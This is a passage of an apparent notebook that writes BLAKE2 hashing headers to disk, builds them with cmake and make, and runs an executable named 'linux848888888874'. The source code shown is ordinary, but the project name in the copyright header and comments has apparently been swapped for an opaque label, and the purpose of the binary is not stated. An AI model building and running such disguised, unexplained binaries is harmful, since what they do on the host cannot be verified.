b1 = _mm_blend_epi16(m2, m7, 0xF0); \
} while(0)


#define LOAD_MSG_4_3(b0, b1) \
do \
{ \
b0 = _mm_blend_epi16(m7, m5, 0xF0); \
b1 = _mm_blend_epi16(m3, m1, 0xF0); \
} while(0)


#define LOAD_MSG_4_4(b0, b1) \
do \
{ \
b0 = _mm_alignr_epi8(m6, m0, 8); \
b1 = _mm_blend_epi16(m4, m6, 0xF0); \
} while(0)


#define LOAD_MSG_5_1(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m1, m3); \
b1 = _mm_unpacklo_epi64(m0, m4); \
} while(0)


#define LOAD_MSG_5_2(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m6, m5); \
b1 = _mm_unpackhi_epi64(m5, m1); \
} while(0)


#define LOAD_MSG_5_3(b0, b1) \
do \
{ \
b0 = _mm_blend_epi16(m2, m3, 0xF0); \
b1 = _mm_unpackhi_epi64(m7, m0); \
} while(0)


#define LOAD_MSG_5_4(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m6, m2); \
b1 = _mm_blend_epi16(m7, m4, 0xF0); \
} while(0)


#define LOAD_MSG_6_1(b0, b1) \
do \
{ \
b0 = _mm_blend_epi16(m6, m0, 0xF0); \
b1 = _mm_unpacklo_epi64(m7, m2); \
} while(0)


#define LOAD_MSG_6_2(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m2, m7); \
b1 = _mm_alignr_epi8(m5, m6, 8); \
} while(0)


#define LOAD_MSG_6_3(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m0, m3); \
b1 = _mm_shuffle_epi32(m4, _MM_SHUFFLE(1,0,3,2)); \
} while(0)


#define LOAD_MSG_6_4(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m3, m1); \
b1 = _mm_blend_epi16(m1, m5, 0xF0); \
} while(0)


#define LOAD_MSG_7_1(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m6, m3); \
b1 = _mm_blend_epi16(m6, m1, 0xF0); \
} while(0)


#define LOAD_MSG_7_2(b0, b1) \
do \
{ \
b0 = _mm_alignr_epi8(m7, m5, 8); \
b1 = _mm_unpackhi_epi64(m0, m4); \
} while(0)


#define LOAD_MSG_7_3(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m2, m7); \
b1 = _mm_unpacklo_epi64(m4, m1); \
} while(0)


#define LOAD_MSG_7_4(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m0, m2); \
b1 = _mm_unpacklo_epi64(m3, m5); \
} while(0)


#define LOAD_MSG_8_1(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m3, m7); \
b1 = _mm_alignr_epi8(m0, m5, 8); \
} while(0)


#define LOAD_MSG_8_2(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m7, m4); \
b1 = _mm_alignr_epi8(m4, m1, 8); \
} while(0)


#define LOAD_MSG_8_3(b0, b1) \
do \
{ \
b0 = m6; \
b1 = _mm_alignr_epi8(m5, m0, 8); \
} while(0)


#define LOAD_MSG_8_4(b0, b1) \
do \
{ \
b0 = _mm_blend_epi16(m1, m3, 0xF0); \
b1 = m2; \
} while(0)


#define LOAD_MSG_9_1(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m5, m4); \
b1 = _mm_unpackhi_epi64(m3, m0); \
} while(0)


#define LOAD_MSG_9_2(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m1, m2); \
b1 = _mm_blend_epi16(m3, m2, 0xF0); \
} while(0)


#define LOAD_MSG_9_3(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m7, m4); \
b1 = _mm_unpackhi_epi64(m1, m6); \
} while(0)


#define LOAD_MSG_9_4(b0, b1) \
do \
{ \
b0 = _mm_alignr_epi8(m7, m5, 8); \
b1 = _mm_unpacklo_epi64(m6, m0); \
} while(0)


#define LOAD_MSG_10_1(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m0, m1); \
b1 = _mm_unpacklo_epi64(m2, m3); \
} while(0)


#define LOAD_MSG_10_2(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m0, m1); \
b1 = _mm_unpackhi_epi64(m2, m3); \
} while(0)


#define LOAD_MSG_10_3(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m4, m5); \
b1 = _mm_unpacklo_epi64(m6, m7); \
} while(0)


#define LOAD_MSG_10_4(b0, b1) \
do \
{ \
b0 = _mm_unpackhi_epi64(m4, m5); \
b1 = _mm_unpackhi_epi64(m6, m7); \
} while(0)


#define LOAD_MSG_11_1(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m7, m2); \
b1 = _mm_unpackhi_epi64(m4, m6); \
} while(0)


#define LOAD_MSG_11_2(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m5, m4); \
b1 = _mm_alignr_epi8(m3, m7, 8); \
} while(0)


#define LOAD_MSG_11_3(b0, b1) \
do \
{ \
b0 = _mm_shuffle_epi32(m0, _MM_SHUFFLE(1,0,3,2)); \
b1 = _mm_unpackhi_epi64(m5, m2); \
} while(0)


#define LOAD_MSG_11_4(b0, b1) \
do \
{ \
b0 = _mm_unpacklo_epi64(m6, m1); \
b1 = _mm_unpackhi_epi64(m3, m1); \
} while(0)


#endif"""

open('./linux8474/linux847466882/blake2/blake2b-load-sse41.h', 'w').write(content)

content="""/*
   BLAKE2 reference source code package - optimized C implementations

   Copyright 2012, Samuel Neves <sneves@dei.uc.pt>.  You may use this under the
   terms of the CC0, the OpenSSL Licence, or the Apache Public License 2.0, at
   your option.  The terms of these licenses can be found at:

   - CC0 1.0 Universal : http://creativecommons.org/publicdomain/zero/1.0
   - OpenSSL license   : https://www.openssl.org/source/license.html
   - Apache 2.0        : http://www.apache.org/licenses/LICENSE-2.0

   More information about the BLAKE2 hash function can be found at
   https://blake2.net.
*/
#ifndef BLAKE2B_ROUND_H
#define BLAKE2B_ROUND_H

#define LOADU(p)  _mm_loadu_si128( (const __m128i *)(p) )
#define STOREU(p,r) _mm_storeu_si128((__m128i *)(p), r)

#define TOF(reg) _mm_castsi128_ps((reg))
#define TOI(reg) _mm_castps_si128((reg))

#define LIKELY(x) __builtin_expect((x),1)

/* Microarchitecture-specific macros */
#ifndef HAVE_XOP
#ifdef HAVE_SSSE3
#define _mm_roti_epi64(x, c) \
    (-(c) == 32) ? _mm_shuffle_epi32((x), _MM_SHUFFLE(2,3,0,1))  \
    : (-(c) == 24) ? _mm_shuffle_epi8((x), r24) \
    : (-(c) == 16) ? _mm_shuffle_epi8((x), r16) \
    : (-(c) == 63) ? _mm_xor_si128(_mm_srli_epi64((x), -(c)), _mm_add_epi64((x), (x)))  \
    : _mm_xor_si128(_mm_srli_epi64((x), -(c)), _mm_slli_epi64((x), 64-(-(c))))
#else
#define _mm_roti_epi64(r, c) _mm_xor_si128(_mm_srli_epi64( (r), -(c) ),_mm_slli_epi64( (r), 64-(-(c)) ))
#endif
#else
/* ... */
#endif

#define G1(row1l,row2l,row3l,row4l,row1h,row2h,row3h,row4h,b0,b1) \
  row1l = _mm_add_epi64(_mm_add_epi64(row1l, b0), row2l); \
  row1h = _mm_add_epi64(_mm_add_epi64(row1h, b1), row2h); \
  \
  row4l = _mm_xor_si128(row4l, row1l); \
  row4h = _mm_xor_si128(row4h, row1h); \
  \
  row4l = _mm_roti_epi64(row4l, -32); \
  row4h = _mm_roti_epi64(row4h, -32); \
  \
  row3l = _mm_add_epi64(row3l, row4l); \
  row3h = _mm_add_epi64(row3h, row4h); \
  \
  row2l = _mm_xor_si128(row2l, row3l); \
  row2h = _mm_xor_si128(row2h, row3h); \
  \
  row2l = _mm_roti_epi64(row2l, -24); \
  row2h = _mm_roti_epi64(row2h, -24); \

#define G2(row1l,row2l,row3l,row4l,row1h,row2h,row3h,row4h,b0,b1) \
  row1l = _mm_add_epi64(_mm_add_epi64(row1l, b0), row2l); \
  row1h = _mm_add_epi64(_mm_add_epi64(row1h, b1), row2h); \
  \
  row4l = _mm_xor_si128(row4l, row1l); \
  row4h = _mm_xor_si128(row4h, row1h); \
  \
  row4l = _mm_roti_epi64(row4l, -16); \
  row4h = _mm_roti_epi64(row4h, -16); \
  \
  row3l = _mm_add_epi64(row3l, row4l); \
  row3h = _mm_add_epi64(row3h, row4h); \
  \
  row2l = _mm_xor_si128(row2l, row3l); \
  row2h = _mm_xor_si128(row2h, row3h); \
  \
  row2l = _mm_roti_epi64(row2l, -63); \
  row2h = _mm_roti_epi64(row2h, -63); \

#if defined(HAVE_SSSE3)
#define DIAGONALIZE(row1l,row2l,row3l,row4l,row1h,row2h,row3h,row4h) \
  t0 = _mm_alignr_epi8(row2h, row2l, 8); \
  t1 = _mm_alignr_epi8(row2l, row2h, 8); \
  row2l = t0; \
  row2h = t1; \
  \
  t0 = row3l; \
  row3l = row3h; \
  row3h = t0;    \
  \
  t0 = _mm_alignr_epi8(row4h, row4l, 8); \
  t1 = _mm_alignr_epi8(row4l, row4h, 8); \
  row4l = t1; \
  row4h = t0;

#define UNDIAGONALIZE(row1l,row2l,row3l,row4l,row1h,row2h,row3h,row4h) \
  t0 = _mm_alignr_epi8(row2l, row2h, 8); \
  t1 = _mm_alignr_epi8(row2h, row2l, 8); \
  row2l = t0; \
  row2h = t1; \
  \
  t0 = row3l; \
  row3l = row3h; \
  row3h = t0; \
  \
  t0 = _mm_alignr_epi8(row4l, row4h, 8); \
  t1 = _mm_alignr_epi8(row4h, row4l, 8); \
  row4l = t1; \
  row4h = t0;
#else

#define DIAGONALIZE(row1l,row2l,row3l,row4l,row1h,row2h,row3h,row4h) \
  t0 = row4l;\
  t1 = row2l;\
  row4l = row3l;\
  row3l = row3h;\
  row3h = row4l;\
  row4l = _mm_unpackhi_epi64(row4h, _mm_unpacklo_epi64(t0, t0)); \
  row4h = _mm_unpackhi_epi64(t0, _mm_unpacklo_epi64(row4h, row4h)); \
  row2l = _mm_unpackhi_epi64(row2l, _mm_unpacklo_epi64(row2h, row2h)); \
  row2h = _mm_unpackhi_epi64(row2h, _mm_unpacklo_epi64(t1, t1))

#define UNDIAGONALIZE(row1l,row2l,row3l,row4l,row1h,row2h,row3h,row4h) \
  t0 = row3l;\
  row3l = row3h;\
  row3h = t0;\
  t0 = row2l;\
  t1 = row4l;\
  row2l = _mm_unpackhi_epi64(row2h, _mm_unpacklo_epi64(row2l, row2l)); \
  row2h = _mm_unpackhi_epi64(t0, _mm_unpacklo_epi64(row2h, row2h)); \
  row4l = _mm_unpackhi_epi64(row4l, _mm_unpacklo_epi64(row4h, row4h)); \
  row4h = _mm_unpackhi_epi64(row4h, _mm_unpacklo_epi64(t1, t1))

#endif

#if defined(HAVE_SSE41)
#include "blake2b-load-sse41.h"
#else
#include "blake2b-load-sse2.h"
#endif

#define ROUND(r) \
  LOAD_MSG_ ##r ##_1(b0, b1); \
  G1(row1l,row2l,row3l,row4l,row1h,row2h,row3h,row4h,b0,b1); \
  LOAD_MSG_ ##r ##_2(b0, b1); \
  G2(row1l,row2l,row3l,row4l,row1h,row2h,row3h,row4h,b0,b1); \
  DIAGONALIZE(row1l,row2l,row3l,row4l,row1h,row2h,row3h,row4h); \
  LOAD_MSG_ ##r ##_3(b0, b1); \
  G1(row1l,row2l,row3l,row4l,row1h,row2h,row3h,row4h,b0,b1); \
  LOAD_MSG_ ##r ##_4(b0, b1); \
  G2(row1l,row2l,row3l,row4l,row1h,row2h,row3h,row4h,b0,b1); \
  UNDIAGONALIZE(row1l,row2l,row3l,row4l,row1h,row2h,row3h,row4h);

#endif"""

open('./linux8474/linux847466882/blake2/blake2b-round.h', 'w').write(content)

content="""/*
   BLAKE2 reference source code package - optimized C implementations

   Copyright 2012, Samuel Neves <sneves@dei.uc.pt>.  You may use this under the
   terms of the CC0, the OpenSSL Licence, or the Apache Public License 2.0, at
   your option.  The terms of these licenses can be found at:

   - CC0 1.0 Universal : http://creativecommons.org/publicdomain/zero/1.0
   - OpenSSL license   : https://www.openssl.org/source/license.html
   - Apache 2.0        : http://www.apache.org/licenses/LICENSE-2.0

   More information about the BLAKE2 hash function can be found at
   https://blake2.net.
*/
#ifndef BLAKE2_CONFIG_H
#define BLAKE2_CONFIG_H

/* These don't work everywhere */
#if defined(__SSE2__) || defined(__x86_64__) || defined(__amd64__) || defined(_M_X64)
#define HAVE_SSE2
#endif

#if defined(__SSSE3__)
#define HAVE_SSSE3
#endif

#if defined(__SSE4_1__)
#define HAVE_SSE41
#endif

#if defined(__AVX__)
#define HAVE_AVX
#endif

#if defined(__AVX2__)
#define HAVE_AVX2
#endif

#if defined(__XOP__)
#define HAVE_XOP
#endif


#ifdef HAVE_AVX2
#ifndef HAVE_AVX
#define HAVE_AVX
#endif
#endif

#ifdef HAVE_XOP
#ifndef HAVE_AVX
#define HAVE_AVX
#endif
#endif

#ifdef HAVE_AVX
#ifndef HAVE_SSE41
#define HAVE_SSE41
#endif
#endif

#ifdef HAVE_SSE41
#ifndef HAVE_SSSE3
#define HAVE_SSSE3
#endif
#endif

#ifdef HAVE_SSSE3
#define HAVE_SSE2
#endif

#if !defined(HAVE_SSE2)
#error "This code requires at least SSE2."
#endif

#endif"""

open('./linux8474/linux847466882/blake2/blake2-config.h', 'w').write(content)

content="""/*
 * linux847466882 reference source code package - reference C implementations
 *
 * Copyright 2015
 * Daniel Dinu, Dmitry Khovratovich, Jean-Philippe Aumasson, and Samuel Neves
 *
 * You may use this work under the terms of a Creative Commons CC0 1.0
 * License/Waiver or the Apache Public License 2.0, at your option. The terms of
 * these licenses can be found at:
 *
 * - CC0 1.0 Universal : http://creativecommons.org/publicdomain/zero/1.0
 * - Apache 2.0        : http://www.apache.org/licenses/LICENSE-2.0
 *
 * You should have received a copy of both of these licenses along with this
 * software. If not, they may be obtained at the above URLs.
 */

#ifndef PORTABLE_BLAKE2_IMPL_H
#define PORTABLE_BLAKE2_IMPL_H

#include <stdint.h>
#include <string.h>

#if defined(_MSC_VER)
#define BLAKE2_INLINE __inline
#elif defined(__GNUC__) || defined(__clang__)
#define BLAKE2_INLINE __inline__
#else
#define BLAKE2_INLINE
#endif

/* linux847466882 Team - Begin Code */
/*
   Not an exhaustive list, but should cover the majority of modern platforms
   Additionally, the code will always be correct---this is only a performance
   tweak.
*/
#if (defined(__BYTE_ORDER__) &&                                                \
     (__BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__)) ||                           \
    defined(__LITTLE_ENDIAN__) || defined(__ARMEL__) || defined(__MIPSEL__) || \
    defined(__AARCH64EL__) || defined(__amd64__) || defined(__i386__) ||       \
    defined(_M_IX86) || defined(_M_X64) || defined(_M_AMD64) ||                \
    defined(_M_ARM)
#define NATIVE_LITTLE_ENDIAN
#endif
/* linux847466882 Team - End Code */

static BLAKE2_INLINE uint32_t load32(const void *src) {
#if defined(NATIVE_LITTLE_ENDIAN)
    uint32_t w;
    memcpy(&w, src, sizeof w);
    return w;
#else
    const uint8_t *p = (const uint8_t *)src;
    uint32_t w = *p++;
    w |= (uint32_t)(*p++) << 8;
    w |= (uint32_t)(*p++) << 16;
    w |= (uint32_t)(*p++) << 24;
    return w;
#endif
}

static BLAKE2_INLINE uint64_t load64(const void *src) {
#if defined(NATIVE_LITTLE_ENDIAN)
    uint64_t w;
    memcpy(&w, src, sizeof w);
    return w;
#else
    const uint8_t *p = (const uint8_t *)src;
    uint64_t w = *p++;
    w |= (uint64_t)(*p++) << 8;
    w |= (uint64_t)(*p++) << 16;
    w |= (uint64_t)(*p++) << 24;
    w |= (uint64_t)(*p++) << 32;
    w |= (uint64_t)(*p++) << 40;
    w |= (uint64_t)(*p++) << 48;
    w |= (uint64_t)(*p++) << 56;
    return w;
#endif
}

static BLAKE2_INLINE void store32(void *dst, uint32_t w) {
#if defined(NATIVE_LITTLE_ENDIAN)
    memcpy(dst, &w, sizeof w);
#else
    uint8_t *p = (uint8_t *)dst;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
#endif
}

static BLAKE2_INLINE void store64(void *dst, uint64_t w) {
#if defined(NATIVE_LITTLE_ENDIAN)
    memcpy(dst, &w, sizeof w);
#else
    uint8_t *p = (uint8_t *)dst;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
#endif
}

static BLAKE2_INLINE uint64_t load48(const void *src) {
    const uint8_t *p = (const uint8_t *)src;
    uint64_t w = *p++;
    w |= (uint64_t)(*p++) << 8;
    w |= (uint64_t)(*p++) << 16;
    w |= (uint64_t)(*p++) << 24;
    w |= (uint64_t)(*p++) << 32;
    w |= (uint64_t)(*p++) << 40;
    return w;
}

static BLAKE2_INLINE void store48(void *dst, uint64_t w) {
    uint8_t *p = (uint8_t *)dst;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
    w >>= 8;
    *p++ = (uint8_t)w;
}

static BLAKE2_INLINE uint32_t rotr32(const uint32_t w, const unsigned c) {
    return (w >> c) | (w << (32 - c));
}

static BLAKE2_INLINE uint64_t rotr64(const uint64_t w, const unsigned c) {
    return (w >> c) | (w << (64 - c));
}

#endif"""

open('./linux8474/linux847466882/blake2/blake2-impl.h', 'w').write(content)

!mkdir ./build/

%cd ./build/

!cmake ..

!make

!./linux848888888874 linux8474
